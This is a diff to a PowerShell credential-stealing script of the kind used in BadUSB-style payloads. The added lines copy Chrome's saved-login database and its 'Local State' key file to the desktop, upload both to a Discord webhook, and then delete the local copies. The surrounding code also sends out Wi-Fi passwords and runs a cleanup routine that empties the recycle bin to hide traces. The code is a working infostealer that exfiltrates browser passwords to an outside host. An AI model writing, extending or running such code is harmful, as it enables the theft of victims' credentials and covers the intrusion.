@@ -33,6 +33,16 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
+$sourceFile1 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data";
+$outputFile1 = "$([System.Environment]::GetFolderPath('Desktop'))\output.txt";
+Copy-Item $sourceFile1 $outputFile1;
+Upload-Discord -file $outputFile1 -text ":)";
+Remove-Item $outputFile1;
+$sourceFile2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State";
+$outputFile2 = "$([System.Environment]::GetFolderPath('Desktop'))\key.txt";
+Copy-Item $sourceFile2 $outputFile2;
+Upload-Discord -file $outputFile2 -text "Key-File"; 
+Remove-Item $outputFile2
 
 Upload-Discord -file "$env:TEMP/--wifi-pass.txt"
 
@@ -57,8 +67,6 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
 
 ############################################################################################################################################################
-
 Clean-Exfil
-
-
 RI $env:TEMP/--wifi-pass.txt
+
